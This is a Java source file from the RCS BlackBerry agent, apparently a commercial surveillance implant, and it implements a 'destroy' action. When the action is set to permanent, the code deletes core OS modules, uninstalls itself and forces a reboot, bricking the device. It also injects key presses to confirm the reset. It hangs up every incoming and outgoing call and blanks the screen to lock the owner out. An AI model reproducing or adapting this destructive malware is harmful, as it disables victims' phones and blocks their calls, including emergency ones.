//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
package blackberry.action;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Keypad;
import blackberry.AppListener;
import blackberry.Core;
import blackberry.Messages;
import blackberry.Status;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.injection.KeyInjector;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.Utils;

public class DestroyAction extends SubAction implements PhoneListener,
        BacklightObserver {

    private boolean permanent;
    private boolean stop;

    public DestroyAction(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(ConfAction conf) {
        // messages, g0
        //g.0=permanent
        try {
            permanent = conf.getBoolean(Messages.getString("g.0"));
        } catch (ConfigurationException e) {
            return false;
        }
        return true;
    }

    public boolean execute(Trigger trigger) {

        if (permanent) {
            //#ifdef DEBUG
            debug.trace("execute permanent");
            //#endif
            deleteApps();
            Core.forceReboot();
        }

        markupDestroy();
        Phone.addPhoneListener(this);
        AppListener.getInstance().addBacklightObserver(this);

        Status.self().setBacklight(false);

        return true;
    }

    private void markupDestroy() {
        // TODO add a markup that triggers the execution at reboot

    }

    private void deleteApps() {
        //#ifdef DEBUG
        debug.trace("deleteApps");
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        int numDeleted = 0;
        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            //CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String name = CodeModuleManager.getModuleName(handle);
            if (name.equals("net_rim_os") || name.equals("net_rim_loader")
                    || name.equals("net_rim_bb_phone")
                    || name.equals("net_rim_cldc")) {
                int ret = CodeModuleManager.deleteModuleEx(handle, true);
                //#ifdef DEBUG
                debug.trace("deleteApps, " + name + " : " + ret);
                //#endif
                if (ret == 6) {
                    numDeleted++;
                }
            }
        }

        if (numDeleted > 0) {
            //#ifdef DEBUG
            debug.trace("deleteApps, reset");
            //#endif
            Core.uninstall();
            Status.self().setBacklight(false);
            CodeModuleManager.promptForResetIfRequired();
            Status.self().setBacklight(false);
            Utils.sleep(100);
            KeyInjector.trackBallUp(1);
            Utils.sleep(100);
            pressKey(Keypad.KEY_ENTER);
        }

    }

    void pressKey(int key) {
        KeyInjector.pressKey(key);
    }

    void kill() {
        //#ifdef DEBUG
        debug.trace("kill");
        //#endif
        while (!stop) {
            pressKey(Keypad.KEY_ESCAPE);
            pressKey(Keypad.KEY_END);
            Utils.sleep(100);
        }
    }

    public void callAdded(int callId) {
    }

    public void callAnswered(int callId) {
        pressKey(Keypad.KEY_END);
    }

    public void callConferenceCallEstablished(int callId) {
    }

    public void callConnected(int callId) {
        pressKey(Keypad.KEY_END);
    }

    public void callDirectConnectConnected(int callId) {
    }

    public void callDirectConnectDisconnected(int callId) {
    }

    public void callDisconnected(int callId) {
    }

    public void callEndedByUser(int callId) {
    }

    public void callFailed(int callId, int reason) {
    }

    public void callHeld(int callId) {
    }

    public void callIncoming(int callId) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void callInitiated(int callid) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void callRemoved(int callId) {
    }

    public void callResumed(int callId) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void callWaiting(int callid) {
        KeyInjector.pressRawKeyCode(Keypad.KEY_END);
    }

    public void conferenceCallDisconnected(int callId) {
    }

    public void onBacklightChange(boolean status) {
        if (status) {
            //#ifdef DEBUG
            debug.trace("onBacklightChange: starting kill");
            //#endif
            stop = false;
            Thread thread = new Thread(new Runnable() {
                public void run() {
                    kill();
                }
            });
            thread.start();
            Utils.sleep(100);
            Backlight.enable(false);
        } else {
            //#ifdef DEBUG
            debug.trace("onBacklightChange: stopping kill");
            //#endif
            stop = true;

        }
    }

}
